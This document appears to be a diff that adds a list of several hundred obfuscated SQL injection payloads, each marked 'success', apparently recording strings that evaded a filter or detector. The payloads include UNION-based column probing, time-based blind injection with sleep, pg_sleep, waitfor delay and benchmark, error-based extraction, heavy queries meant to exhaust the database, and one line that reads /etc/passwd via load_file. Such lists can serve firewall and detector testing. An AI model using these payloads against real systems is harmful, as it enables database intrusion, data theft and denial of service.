@@ -1,0 +1,629 @@
+0 success "0x1%'\t  )    )    union all/*s>([*/select null,null# SY"
+1 success "-8159 where '$'<>'$I'/**/union all select 2793,2793,2793,2793,2793#/*YE3*/"
+2 success '-0x200b"\n ) \n\x0cunion all/**/SelEct 6394,0x18fa,6394,6394,6394-- '
+6 success "-7142'   ) \n/**/ ) /**/ \x0bunion all Select (SELECT 5083),0x13db,5083,5083# rA"
+7 success "1'/**/where 8864  =  8864 "
+8 success "0x1%' union all sElEct null,null,null# yn_`jp"
+11 success '1"   )    )    AS xwrq WHERE 4161   LIKE   0x1041 aND \'{I\' NOT LIKE \'{Ip\' oR 0x0 '
+15 success "1%' ANd 2006\n\t= /*O\tV*/2006 "
+16 success '-0x2347%"  )   order by/**/1-- '
+17 success "-2715'   )    )    union all/**/select 8646,8646,(SELECT 8646),8646,8646,8646,8646,8646-- "
+20 success "1%'  /**/)   /**/)   /**/waitfor delay '0:0:5'-- fs"
+22 success "SELEct pg_sleep  ( \t0x5  )   AND    (    (   'vxxg'  =  'vxxg "
+23 success '0x1   )    )     )   And sleep  (  0x5  )  # p'
+24 success '-2378" where/**/0xa7e  =  2686 or \'ccc\' NOT LIKE \'ccc9\'-- '
+25 success "-4330'\x0bunion all seleCt 3059,3059,3059,3059,3059,3059,3059,3059,3059--/**/"
+27 success 'iif  (  1878 \xa0 LIKE   2513,1,1/0  )   '
+29 success 'eND AnD    (   \x0c(   0x870  =  2160 '
+30 success "-6220'/**/union all seLeCT (SeLECt\x0b0x5b6),1462# "
+34 success '-4543" /**/)   OR 4136 NOT LIKE 4137 '
+35 success '-9659   )    )     )  /**/union all sElECT 8665,8665,8665,8665,(SELECT 8665),8665,8665-- '
+36 success '1" WhErE 9889  \x0bLiKE   (SELEct (seLECT 9889)) '
+37 success "-9014%'  )/**/  union\tall SElECt 4211,0x1073,4211,4211,0x1073,4211# "
+39 success '0x1  )  /**/union all SELECt null,null,null,null,null,null-- qc'
+41 success ' seLEcT * FRom users WhERe id   lIke   1  OR  ".  )  " Or/*N */\'m\' NOT LIKE \'md\' -- (SELECT (SELECT 1)) '
+42 success "1'||  (  select 'svnn'\xa0fRoM dual where/**/8710/**/  LIKE   8710 "
+43 success '0x1"  )   && sleep  (  5  )  #/**/'
+44 success '1  )   AS bpap wHeRe 0x1e4e  =  (Select 7758) AnD 9951 LIKE 9951 oR 4240   LiKe     (  sELECT\t4240 fRoM pg_sleep  (  5   )/**/   ) /*@;|%\r*/ -- pL'
+45 success '0x1\xa0  )   \n)    as wajy wHerE 0x2191   LIKE   (sEleCT (SELEcT 0x2191)) '
+47 success '1,  (  SELeCT   (  caSe wHEN   (  5900 NOT LIKE 5901 AND 6220 LIKE 6220  )  /**/THEn 1 ELSE cast  (  1 as int  )  /  (  SELECt 0 frOm dual  )   END  )   From dual  )   '
+48 success 'SeleCt   (  cAsE When   (  9393   lIKe   5530  )   ThEn 0x24b1 Else cast  (  1/**/AS int  )  /  (  selECt 0 FrOM dual  )   eND  )   frOm dual-- '
+49 success 'SELEct   (  cAsE wHen   (  8993   LIKE   8846  )   THeN 8993 ELse 8993*  ( /*VjF)J*/seleCt 8993 from mysql.db  )   eNd  )  # P'
+50 success "-0x250c' or   (  7129  =  0x92d /*ja7!G*/)  *2349 and 'fcsa' like 'fcsa "
+53 success "-9653'/**/ )/**/  WhEre 0xa91   like   2705 or 9323 /**/=  9323 OR 7343 NOT IN (7342,7343,7344)# +4"
+55 success "-9541  )   as bnky where ',23' LIKE ',23' AND 'r'<>'r9' union all select/**/3934,3934,3934# "
+57 success '1  )   oR   (  SEleCt 2*  (  if   (    (   SEleCt * frOM   (  SELEcT concat  (  0x7171706a71,  (  SelECt   (  elt  (  8113   lIKe   8113 AND 1203 NOT LIKE 1204 OR 0,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, 8446744073709551610   ) \n  )     )   &&   (  7737 like 0x1e39 '
+58 success '1\t  ) /**/  )    As xzcl Where (sELeCt 2332)   lIKe   2332 '
+60 success '1   )    )   \x0c )   aND elt  (  4249   LIkE   (sELeCt 4249),7259  )   ANd    (    (     (  931 NOT LIKE 932 AnD 1 '
+65 success "-0x20cd'   )    )     )   oR 2171   LIKE  /**/4788 "
+66 success '-(SeLECT 0x2609)"   ) /**/\xa0 )     )   order/**/by 0x1-- '
+67 success "-1256' IN/**/boolean mode  )  /*ozo*/union all SeLeCT 7889,7889,7889,7889,0x1ed1,7889,7889,7889,7889--\x0b"
+69 success '1  )   AND elt  (  0x1d01  =  8842,8842  )/*Pn\t*/ \tAnD   (  0x23ea  =  9194\nOR (SelecT 0x0) '
+70 success '1  )   WHerE (SELECT 5309)   LIKE   5309 Or 7552   like     (  sElECt count  (  *  )   FrOm rdb$fields aS t1,rdb$types As t2,rdb$collations AS/*vcm*/t3,rdb$functions AS t4  )  -- HJ5'
+71 success ' sElECT * fRoM users wherE id \t like   1 || 1#"? union seLeCt null,version  (    )   -- 1\xa0qdO'
+72 success 'SElect '
+74 success "-9574'  )   As rxym wHEre/**/4719   LIKE   4719 union all SEleCt 4719,4719,4719,4719,4719,4719,4719-- 4 "
+80 success '1\torder/**/by 1--\x0b'
+82 success "1'+  (  sElEct iutk WHEre 6158\n =  6158 ANd True "
+83 success '-4885 union all/**/select 4589,4589,4589,4589,4589,4589,4589,4589,4589,0x11ed# '
+85 success ' SeLecT * From users/**/wHerE id   LIKE   (SeleCT\xa01) Or 1#"(SElECt 1) union sELECt \'a\',version  (    )   -- 1 t'
+86 success '-(SELECT 9891)" union all/**/select\n0x1d41# lV'
+88 success "0x1' whERE ' '<>' $'/**/order\x0cby 0x1-- "
+89 success '(sELect 0x1)  )   WHERE 0x1380  =  0x1380 '
+91 success 'iF  (  3593   like   (seLeCT 3779)  )   selEcT 3593 eLSE DRop function/**/qtqy-- '
+93 success '(SELECT (SELECT (SELECT/**/1)))" \x0b )    )     ) \xa0/*|>*/'
+95 success "-4699  )   As mymz WHERe 'JkS' NOT LIKE 'JkSu' oR elt  (\x0c 1032  =  1032,3623  )  --/**/"
+96 success ' sELeCT * from users whEre id  =  1 OR/**/1#"{ union selecT null,version  (\x0b   )   -- 0x1 '
+97 success '-9356 Or elt /*!.,|v*/(  1032/**/  like   1032,3623  )  -- izgi '
+99 success "1' and/**/elt  (  4467 NOT LIKE 4468,7259  )   and 'nsbj' like 'nsbj "
+100 success '0x1  )   Or 0x25ab   LIKE     (  seLECT count  ( /*L5*/*  )   FRom domain.domains AS t1,domain.columns AS t2,domain.tables aS t3  )   '
+101 success '1 where (SELECT/**/2060)   like \x0b 2060 '
+102 success "1'\x0cwhere\t't$'='t$'/**/and\n1 "
+103 success '1" wHeRE \'0A\'=\'0A\' '
+106 success '-1447" union/**/all select 3013,3013,3013,3013,3013,3013,3013--\x0b'
+108 success "-4828'+  (/*}9X*/ sElect qxnw wHerE 5257 like 5257 union all/**/sELEcT\x0c9488,(SeLect 9488)-- AG"
+109 success '-(SELECT 6381)%" \xa0 )    )    \n)/*s >*/ /**/union all\xa0sEleCT 1503,1503,0x5df,0x5df# '
+110 success '0x1  )   wHErE 9010   like   9010 And 8514 /**/ like     (  SeLecT count  (  *  )   froM domain.domains AS/*LqnH|*/t1,domain.columns As t2,domain.tables AS t3  )  --\xa0'
+111 success "1'   )    )    AS xqvq wHeRE 8407 IN (8406,(SELECT 8407),8408) oR 4240   LIKE     (  SEleCT 4240 fRoM pg_sleep  ( /**/5   )  \x0b )   -- V"
+112 success '1"/**/order by 1# '
+113 success '-2071 union all\x0bselect/**/4753,4753-- *86'
+114 success "1' where 0x375 LIKE 885 "
+115 success "1  )   waitfor delay '0:0:5' ANd   (  1063 IN (1062,1063,1064) "
+116 success "0x1%'  )   oR 0x2142  =  benchmark  (  5000000,md5/*{s*/ (  0x544d5a4c   ) \t  )   # JN"
+117 success '0x1  )   OR 4915   LIKE     (  SELecT count  (  *  )   FRom domain.domains as/**/t1,domain.columns as t2,domain.tables aS t3  )  -- U'
+118 success "seleCT count  (  *  )   FrOM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables AS t3 ANd    (/**/   (     (  'vcgc' LIKe 'vcgc "
+119 success '-5560"   )    )    or (SELECT 7292) \n/**/LIKE   6184# '
+122 success "0x1'  )   where 2120   LIKE   2120 AND 9567 IN (9566,9567,9568) && 0x1\xa0AND True "
+124 success '1" anD elt\xa0 (  (selEct/*>L^:[*/4249)   like   4249,7259  )   '
+135 success 'select count  (  *  )   FRoM domain.domains as t1,domain.columns/*)1IN*/as t2,domain.tables aS t3# kuqm '
+136 success "-7088'||  (  select 'arol' frOm dual WHEre 8891  =\x0c 8891 union/**/all SEleCT 8891,8891,8891,8891,8891,8891,8891,8891# "
+137 success " having 1  =  1 OR '4' LIKE '0x4`'--/**/_T"
+139 success '0x1"\n )   AS rcnk wHeRe \'K>\'<>\'K>X\' or 0/**/'
+141 success '0x1%"  )   anD 8024/**/ =  0xde8-- 2E'
+143 success "-5528'  )   union all\x0bSELeCT 5153,5153,5153,5153,5153,5153,5153,5153,5153# C"
+144 success "(SELECT 0x1)' or/**/0x2112  =  benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )    and/**/'raru'  =  'raru "
+145 success "SElect count  (  *  )   FRoM generate_series  (  1,5000000  )   anD    ( \x0c/**/ (  \x0b7240   liKE   7240 anD '&\\' NOT LIKE '&\\i' "
+147 success '1"  )   As fgne\x0bwHeRE 7207  =  7207 '
+148 success 'sELEcT * From generate_series  (  9058,9058,caSe whEn   (  9058/**/  LIKE   1183  )   ThEn 1 else 0 END  )   limit 1-- '
+149 success "1'+  (\n sELect mkbv wheRe 0x670  =  (seleCt 1648) AnD 9254  =    (  SElEct count  (  *  )/**/  fRom rdb$fields AS t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions As/**/t4  )  -- "
+150 success 'select count  (  *  )   from generate_series  (  1,0x4c4b40  )  /*qp}>"*/&&   (  \'qpdu\'   LIKE\t  \'qpdu '
+152 success '0x1"  )   where (SELECT 0x26ea)   LIKE   9962/**/and 0x11f3\n  LIKE   0x11f3# +'
+154 success '1"\tWheRE/**/2638 NOT LIKE 2639 '
+155 success '1 whEre 6100  =  6100 aNd 2441!=2442 ANd 2716  =    (  SElECT count  (  *  )   From/*z\\*/sysusers As sys1,sysusers AS sys2,sysusers AS sys3,sysusers aS sys4,sysusers aS sys5,sysusers AS sys6,sysusers As sys7  )  -- '
+157 success "0x1%' union all SeLecT/**/null,null,null-- "
+158 success "1'   )    )    As xkiq wHeRE (SELECT 9008)   lIke   9008/**/oR 0 aND sleep  (  5  ) \t-- "
+159 success "-2028'\x0c\x0c )    )     )  /**/union all seLECT\x0c8698,8698,8698,8698# _."
+162 success "oR 1  =  1 OR 'Y' NOT LIKE 'Y'/* "
+163 success "-9370'  )   wheRE 4616 LIKE 4616 OR 0 || make_set  (  0x248a  =  9354,7185  )  -- \\x"
+164 success "0x1'||  ( \tselect 'hwdj'\x0cwHeRe '+'<>'+w' "
+165 success "0x1'  )   where/**/1149 NOT LIKE 1150 OR 0 AND True and elt\x0b/*SIbbH*/(  'So)m' LIKE 'So)m',sleep\x0c (  5   )    )   -- "
+166 success "0x1'|| /**/( \x0bselect 'ymre'/**/WHERE (seLECT 8681)   Like /**/ 8681 "
+168 success '1" whEre\xa0\'W\' NOT LIKE \'Wl\' '
+173 success 'seLECT benchmark  (  (sElect 0x4c4b40),md5  (  0x4c4d6142   )    )    And /**/ (  "%"   liKE   " '
+174 success " )   Or   (  'x'   like /**/ 'x "
+179 success "1'  )  /**/as rhvm where 1420   like  /**/1420 "
+181 success '1  )   oR elt  (  8772=0x2244 AND True,sleep  (  0x5   )    )    aND   (  8600  =  8600 '
+183 success 'select/**/case when 5559   like   3483 then 1 else null end--\n'
+186 success 'select sleep  (  5  )   &&    (    (/**/  \t (  "lczw"   like   "lczw '
+187 success "call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   ANd   /*-\t2J*/(    (     (  'opyt'   like   'opyt "
+190 success '(SELECT 1)   )/*4-M*/   )  '
+192 success "-4955%' union all sElECT/**/5928,5928-- \n;"
+194 success ' SeleCt * froM users WHerE id   liKE   1 <@. union SEleCt 1,version  (    )   -- 1 '
+196 success "(SELECT 1)' union all/**/select\nnull,null,null,null,null,null,null,null# "
+197 success "0x1'  )   aS yyyb WhERE 1705  = \t1705 OR 8667 NOT LIKE 8667 aNd   (  8770  =  6988\x0c )  *6988-- "
+199 success 'SELeCt * frOM users wheRE id  =  1 oR \\<   =  0x1 OR 8603<>8604 AND True -- 1 \rVu;'
+200 success "1'|| /**/(  select/**/'etvo' from dual where 'VSw' LIKE 'VSw' OR 0/**/OR False OR 'HE\x0c' LIKE 'HE\x0c1'\xa0"
+204 success "-(SELECT 8410)'  /*&J)0x3*/)    ) /**/   )   or\x0c'c'!='cj'-- "
+208 success "(SELECT 1)' in boolean mode  )   && sleep  (  5/**/\x0b)  # "
+209 success '1" whEre \'Z{d\' not like \'Z{dB\' oR (seLEcT 8315)   LIke \x0b   (  SeLect count  (  *  )   fRoM sysibm.systables as t1,sysibm.systables As t2,sysibm.systables aS t3  )  -- G'
+211 success ' end AND/**/"%" \x0b LIKE   " '
+212 success "1'+  (  sElEcT\tyjyp whEre 9696  =/**/ 9696 "
+215 success "1'   )    )    aS tcby WHERe 5213   lIkE/* |FP*/  0x145d "
+217 success "sELECt sleep  (  (sELECT 5)  )   And    (    (     ( /**/'iwwa' liKE 'iwwa "
+221 success '1" /**/ )    )    as jgie WhERE (SElEcT 8017)   LIKE   8017  AND    (  SEleCt * fROM   (  SELeCT  (  sleep  (/**/ 5   )    )     ) /*\n*/fzno  )  -- '
+222 success "1'/*^~k*/where/**/')2L\x0bA' LIKE ')2L\x0bA' "
+223 success "-4373'+  ( \x0bselect/**/'rlht' where 4431 LIKE 4431 OR 0 union all/**/select 2285,2285,2285# "
+224 success "call regexp_substring  (  repeat  (  lefT  (  crypt_key  (  char  (  (sELecT 0x41)  )   Or char  (  (SElEcT 69)/**/ )   OR char  (  83  )\t ,null  )  ,0  )  ,0x1dcd6500  )/**/ ,null  )\t  aND    (    (     (  'gtcb'   like   'gtcb "
+226 success "0x1' In boolean mode  )   anD\t(SELECT 0x165d)   LIKE   0x15b0# "
+227 success 'seLEcT * FrOm users wHErE id  =  1 +   (  \\+  )   Or 1  =  1 -- (SELECT 1) '
+228 success "1'\x0bwhere 0x1351  =  4945 AND True OR 'hL' LIKE 'hL5' "
+230 success ' (  sELEcT   (  CAse WhEN   (  1570   LIKE   6977 \x0c)   TheN 1 ElsE 1570*  (  SeLeCT 1570 FROM mysql.db  )   END   )    )  '
+232 success "0x1'  )   union/**/all select null,null,null,null,null,null-- Q"
+233 success '0x1   )    )     )   aNd 3824   LIKE   benchmark  (  5000000,md5  (  0x76555642   )    )    And    (    (     (  6556   liKe   (SelEcT 6556) '
+235 success "-(SELECT 5327)'   )  \x0b )     )   OR 1606   like   6099 "
+237 success '(SELECT 0x1) union all/**/select null,null,null,null,null,null,null,null# '
+238 success "1'+  (  select 'tjvt' where 1209 NOT LIKE 1210 "
+239 success '1"   )    )    aS xbhp\x0bwHeRE \'Wh0n\' NOT LIKE \'Wh0nC\' '
+241 success "0x1'||  (  select 'vdeo' where 'ODT'='ODT' OR 'Wa#' NOT/**/LIKE 'Wa#' Y"
+242 success 'select/**/pg_sleep  (  5  )   && "%"  =  " '
+243 success "(SELECT 1)'/**/rlike\nsleep  (  0x5  )  # &l"
+245 success "0x1'  )   && (SELect 0x20d7) \x0c LIkE/**/    (  seleCT count  (  *  )\x0b  froM generate_series  (  0x1,0x4c4b40   )    )    "
+246 success 'SeLECt sleep  (  5  )   ANd    (    (   8679   LIKE   8679 and 1214 IN (1213,1214,1215) '
+248 success '-2276"   )    )    aS qwow WhERe 7326 LIKE 7326 aNd True OR 3534   lIKe   2971-- '
+249 success '0x1 wheRe 2649   lIKE   2649 ANd 3493<>3494 ||   (  sELECt * FROm   (  selEct  (  sleep /**/(  5  /**/)    )     )  ydpu  )  -- P'
+250 success "0x1'  )   where 3967<>3968 AND 'I' LIKE\x0c'I' OR (SeLecT 2584) NOT iN (2583,2584,2585) OR 0 union all\tSeLect null,null,null,null,null# "
+255 success ' SELeCT * frOm users WhERE id   like   \'1\' union/**/SELECt $["],@@VERSION --/**/1\' '
+258 success '1"  )   AS jqli WHerE (sEleCt 7793)  =  7793 '
+259 success 'sELeCT\t\xa0 (  cAsE/*]Xf*/wHEn   (  0x1648   Like   4125  )   THen/**/5704 eLsE cast  (  1 As int  )  /  (  selecT 0 fROm dual  )   eNd/**/ )   frOM\xa0dual-- '
+260 success '1  )   aS\x0ccejp WHeRE 5715 LIKE 5715 OR 0 OR 5286   like     (  SeleCt count  ( /**/*  )   FrOm/**/all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
+262 success "-5356'  )   oR/**/0x246b  =  9323# 0"
+264 success "0x1' IN boolean mode  )   rlike   (  seleCT * FroM   (  selECT  (  sleep/*v*/ (  5   )    )     )  sgvo  )  # F18"
+267 success '0x1 \xa0 )    )   /**/union all SelecT null,null,null,null-- QU'
+269 success '/*h[*/SElecT * from users WheRe id   like   1 OR "1{" Or \'=s\'<>\'=sd\' -- (SELECT 1) '
+273 success '1"   )   /*\n&[>l*/)    \n) \t/*\tV*/oR sleep  (  (SeLecT 5)  )  # G^'
+275 success 'declare @s varchar  (  22 /**/)   select/**/@s \t  LIKE   '
+282 success "1' and elt  (  6402 IN (6401,6402,6403),7259/*2ZMUU*/ )   "
+283 success "1 whERe 7362   LIKE   7362 AND '#'<>'#,' OR False ANd/**/True aNd 8148/*bN*/  LIKe   lIKE  ( \n'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ttI"
+284 success '-1084 wHERE 0x49d   like   1181 OR make_set  (\t 9354  =  9354 OR False,7185  )  -- '
+297 success '-2453"  )   union all select/**/4520,4520,4520,4520,4520,4520,(SELECT 4520),4520,4520,4520--\x0b'
+300 success "1'  )    oR  sleep \x0c(  0x5  ) /**/"
+301 success "1'  )   union/**/all SelecT null# "
+303 success ' SElEcT * FRom users WherE id   lIKe   1 Or 1#"$ union seLect \'a\',version  (/**/   )   -- 1 G'
+304 success "0x1'   )    )    aS qcgf WhERE '^g'<>'^gi' aNd True oR 5356  =    (/*1L|D*/ SelECT count  ( \x0b*  )   fROM sysusers as sys1,sysusers as sys2,sysusers AS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )  -- _"
+305 success "select * from users where id \n LIKE   '1'/**/or $<\\ or '0' NOT LIKE '0K' -- 0x1' 1"
+306 success '1"  )  /**/where \':\'<>\':q\' '
+308 success "(SelECt 1)%'   )    )     )    OR    (  SelECT * FROm/*wv6PW*/  (  sELEcT  (  sleep  (  0x5   )    )     )  sddo  )  # "
+310 success ' END &&    (    (     (  "memh" lIkE "memh '
+311 success '/**/selECt * fRoM users wHere id  =  1 OR ";#" or 1095\x0ciN (1094,1095,(seLeCt 1096))/**/-- 1 '
+312 success '1   )    )   /**/And updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SELEcT   (  elt\n (  0xa9b NOT LIKE 2716 AND 4133 NOT LIKE 4134,1/**/  )    )     )  ,0x717a767a71  )  ,0x489  )   AND    (    (   7729 NOT LIKE (SeLEct 7730) '
+313 success '1\'+  (  select taga Where/**/\'c"f2\' NOT LIKE \'c"f2d\' '
+314 success '-8639  )  \tOR 8138  =  6252/**/'
+316 success ' (  SelEcT   (  CAse WHEN   (  0x1793\t  lIke   (SelECT/**/9882)  )   tHEN 6035 ELSE 6035*  (  SELecT 6035 FROM mysql.db  )   END   )    )  '
+318 success "1'+  (  sElecT gqez wHeRE 3704  =  3704 AND True AND '{&$'!='{&$&' "
+319 success '-(selECt 7416)" WHERe 0x1de8  =  7656 OR 0x0\x0border by 0x1-- '
+321 success "1 \n)  /**/wheRe ')' liKE ')' "
+322 success 'If  (  3392   likE   4422  )   SElECT/**/3392 Else drOp function xsqq-- '
+324 success '-5520%" union all select/**/5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- '
+327 success "1'  ) \t\nWHERE 8707 \n= /**/8707 And 3210   like   1477-- "
+328 success '-3130  )\t  union all SElecT/**/1741,1741,1741,1741,1741,1741,1741,1741# '
+330 success '1%"  )/**/  and 6181 NOT LIKE 6182 AND \'(\'<>\'(p\'-- '
+332 success "-9393' wheRe 3856 NOT LIKE 3857 oR 8571  =  8571-- "
+334 success "-3775'/**/ )   as rqet/**/where 0x1bb4  =  0x1bb4 or elt  (  '\x0cN'!='\nN&',3623  )  -- "
+335 success " union select 0x1,load_file  (/**/ '/etc/passwd'  )  ,1,1,1; "
+336 success '0x1  OR  8466  =  benchmark/**/ (  5000000,md5  (  0x694a4745   )    )   # irvm/**/b'
+337 success "-2855'\tunion/*L*/all\x0bseLeCt 2495,2495,2495,2495,2495,2495,2495,2495,2495--\t"
+338 success "-8629/**/whEre '/'<>'/<' oR False Or 792=793/**/union\x0call sELEcT 8049,8049,8049,8049,8049,8049,8049# `r"
+339 success '0x1  ) /*|px"6*/ AS mixt WheRE 9915 NOT LIKE/**/9916 aNd True oR sleep  (  0x5  )\x0c -- '
+340 success "(SELECT 1)'   )    )    aND (seLEct 0x25bc)   liKe /*E-d*/   (  seLEct count  (  *  )   FrOm all_users t1,all_users\tt2,all_users t3,all_users t4,all_users t5 /*k7[O*/)  -- ZA"
+342 success "0x1'  )   WHerE 6731   liKE   0x1a4b oR elt  (  5873  =  5873,sleep  (  5   )    ) /**.N.H*/ # H"
+344 success "1   )    ) \x0c  AS/**/fpej wherE 6790   lIKE   6790 and   (  6481<>6482 aNd 'xO' NOT LIKE 'xO]'  )  *6703-- "
+345 success "call regexp_substring  (  repeat  (  right  (  char  (  3702  )/**/ ,0 \t)  ,500000000  )  ,null  )   aND   (  'cixa' LIKe 'cixa "
+346 success '1%" && 2805  =  1345 '
+347 success "0x1' procedure analyse  (  extractvalue \xa0(  5840,concat  (  0x5c,0x7171706a71, \t(  sElECT   (  CAse when/**/  (  0x236b In (9066,0x236b,9068) anD True  )   thEN 1 ElSe (SELECT 0) end   )    )   ,0x717a767a71   )    )   ,0x1  )   "
+351 success "(sELEcT 1)' iN boolean mode \x0c)   aND 3824/*Q*/  like   benchmark  (  5000000,md5  (  0x76555642   )    )   # "
+352 success '%(SELECT/**/27)\nOR/**/1 /**/ LIKE /**/ 1/**/'
+358 success '(SELECT 1)"  )   as zuzm where \'`^j]a\' NOT LIKE \'`^j]a"\' anD elt  (  5458   LIKE   (SELECT/*N*/2966),2966  )\t -- r0\tJ'
+359 success "1'+  (  SeLect oogh whERe 1167  =  1167 oR elt  (  5873  =  5873 OR False,sleep  (  0x5 \n )    )   # 4^"
+360 success "0x1' in boolean mode  )   && (SELECT 0x177) NOT LIKE 376-- "
+361 success 'iif  (  3760 /*>x~\rf*/ LIKE   4785,1,1/(SEleCt 0)  )   '
+364 success '(SELECT 0x1)"" /**/(  .\'.  ( /**/,  ( \t. '
+365 success "-5386'  ) \x0b union all sELEcT 8026,8026,8026,8026,0x1f5a,8026# "
+366 success '-4165"\twhERE 1576 not like 1577 AND True union all SEleCT 1772,1772,1772,1772,1772,1772,1772,1772-- '
+367 success " (  Select   (  cASe wHen   (\x0b '=_vW' LiKE '=_vW'  )   tHen 1 ElSE 0x58d*  (  SelecT 1421 FrOm master..sysdatabases  )   EnD   )    )  "
+370 success "1'+  (  select gthp where '`q' NOT LIKE '`q{' OR '}DZL' NOT LIKE '}DZL' OR sleep  ( /**/5\t )  # p_"
+371 success '0x1   ) /**/  )\n    )/*e3*/ /**/union all SELect null,null,null,null,null,null,null,null,null,null-- dp0'
+373 success "0x1  )   or/**/elt\x0b (  'p' NOT LIKE 'pL',sleep  (  (SELECT 5)   )    )   # "
+375 success "0x1%'\x0b )   oR 0x93f   lIke     (  seLect count  (  *  )   fROm rdb$fields as/**/t1,rdb$types As t2,rdb$collations AS t3,rdb$functions aS t4  )\n -- "
+376 success "1' aND/**/2716  =    (  sELECT count  (  *  )\x0b  FRom sysusers AS sys1,sysusers aS sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers/**/AS sys6,sysusers AS sys7  )  -- "
+377 success '1  )   aNd 0x2142  /**/LiKe     (  SELeCt count  (  *  )   FrOm domain.domains AS t1,domain.columns as t2,domain.tables AS t3  )   '
+378 success 'sElecT   (  cASE WhEN   (  7217  =  7631  )   tHen 0x1c31 eLSE 7217*  (  SELeCt 7217 fRom information_schema.character_sets \t)   enD  )  # '
+379 success "selEct * FrOM users wHEre id  =  '1'\x0b*$ 1 oR 1  =  1 -- (SELECT 1)'/**/"
+384 success '1  )   aS lisg wHeRE 0x1572   LIKE   5490 '
+386 success '1   )    )  \n As rvex wheRE 3462  =  0xd86  And  4595   lIkE   4595# '
+387 success '1" WHerE 4298   like  \n4298 AND True oR False order by 1-- '
+388 success '-4494 oR 0x14ab  =  (sElEct 4452) '
+389 success 'waitfor/**/delay \'(SELECT (SELECT 0)):0:5\' AnD   (  "dmcu"  =  "dmcu '
+390 success "1%' union/**/all SElecT null,null,null,null,null,null,null,null,null,null# "
+391 success "0x1'||  (  select 'lljg' From dual WHErE 7631  /*t^7i*/LIKe   7631 || 0x667 NOT LIKE 1639 "
+394 success "1'+  (  select 'vabj' wHeRE '\n9' NOT LIKE '\n9['/**/union all SELECT null,null,null,null,null# "
+396 success "-9937' \x0b )    )   /*3~}*/union all seLeCt 3900,3900,3900,3900,3900,3900,3900,3900,3900# F\x0b"
+397 success '1,  (  SeLEct   (  CaSE whEN   (  3902   lIKE   3902 AND True  )   TheN   (  SELEct count  (  * /**/)\n  FRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   ELse 1/  (  sEleCT 0 From dual  )   enD  )   FROM dual  )   '
+398 success '-9860  )   where 5664 NOT LIKE 5665 union all select/*9\\*/8743,8743,8743,8743,(SELECT 8743),0x2227,8743-- [4'
+401 success 'sElECT benchmark  (  5000000,md5  (  0x4c4d6142   )    )    AnD    (    (     (  9847   LIKe  /**/9847 '
+402 success '1  )   WHEre 8671  =  8671 oR False anD make_set  (  4931  =/**/ 1642,1642  )  -- '
+404 success "0x1  )   whErE 'u$^' LIKE 'u$^' ANd 0x25bc   LikE     (  SElECt count  (  *  )   FROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --\n"
+405 success '0x1" /*><T^0x6*/ )    )  \t union/**/all SELECt null,null,null,null,null# m'
+409 success 'iif  (  1157/**/  like   0x11be,1,1/0  )   '
+410 success "seleCt lIKE /*(w&*/(  'abcdefg',upper  (  hex  (  randomblob/**/ (  500000000/0x2   )    )      )    )    AND    (   \x0b(   'nimx'   liKE   'nimx "
+412 success "sElEct pg_sleep\xa0 (  0x5  )   anD 'zfyy'   LiKe   'zfyy "
+413 success "0x1%'\x0b  )    )     )   orDeR/**/by/**/0x1-- "
+415 success 'sElEcT   (  CASe whEn   (  4061\x0b =  1396  )   then 4061 ElsE 1/  ( /*}F5*/SelEct 0  )   ENd  )  -- T'
+416 success "-9509'  )   where 9303   LIKE   9303 AND True/**/order by (SELECT 1)# "
+418 success "1%'  )   AnD (SELECT 2716)   LIkE     (  sElecT count  (  *  )   FrOm/**/sysusers aS sys1,sysusers As sys2,sysusers AS sys3,sysusers As sys4,sysusers as sys5,sysusers aS sys6,sysusers as sys7  )  -- "
+419 success "1' waitfor delay '0:0:5' and/**/'vwuz'\xa0/*w}*/=  'vwuz "
+421 success '1"  )   wheRe \'kr\' LIKE \'kr\' And 0x80c LIKe 2060 And extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  SElect   (  elt  ( /**/\'y7\' NOT LIKE \'y7I\',0x1   )   /**/)     )  ,0x717a767a71   )   \x0b)   -- L'
+423 success 'iif  (  8354   LIKE   3515,0x1,1/0 \x0b)   '
+429 success '  (  seLECT\n* FROm   (  SelecT  ( /**/sleep  (  0x5\xa0\x0b )    )     )  srmq  )   &&   (  "avyw"   LikE   "avyw '
+433 success '-2448%"  )   OR 9791<>9792 '
+434 success 'sEleCT CaSe WHEN (SElEcT 9390)   LiKE   5752 THen (SeLECt 1) ElSe null\xa0END-- JZ'
+435 success '1" && elt  (  4594   like   1040,1040  )   '
+438 success "0x1'  )   as chla where (SELECT 6098)  =  6098/**/OR '5d' LIKE '5ds' "
+440 success 'SELECt/**/count\x0c (/**/ *  )   frOm domain.domains As t1,domain.columns aS t2,domain.tables AS t3 aND /**/ \n(    (   "vqpx" liKe "vqpx '
+441 success "-6254%'   )    )     )  \xa0oR 1 group by concat/**/ (  0x7171706a71,  (  seLEcT   (  CASe whEn   (  2547<>2548 OR False  )   THeN 0x1 ElSE 0 ENd   )    )   ,0x717a767a71,floor  (  rand  (  0x0  )  *2   )    )    having miN  (  0  )  # f/t"
+442 success 'selECt   (  CaSE WHen   (  (SelECt 0x2702)  =  8342  )   Then (sELECT 9986) eLSe 9986*  (  SELeCT 9986 frOm information_schema.character_sets  )   ENd  )  # '
+443 success '0x1   )    )    OR 8315  =    (  sELect/*NAw|N*/count  ( \x0c*  )   froM sysibm.systables aS t1,sysibm.systables as t2,sysibm.systables AS t3  )   aND    (    (   2868 LiKE\x0c2868 anD 7162!=7163 '
+444 success "0x1'  )   AND 7533  =  7533 AND 2894!=2895/*1B*/"
+446 success "-(SELECT 1621)' in boolean mode  )  \x0corder by/**/1-- "
+447 success '1"  )  /**/as pobe\x0bwhere \'d+/u\'!=\'d+/uR\'/**/'
+448 success '1 where 5121 NOT LIKE 5122 union all select/**/null,null,null,null# '
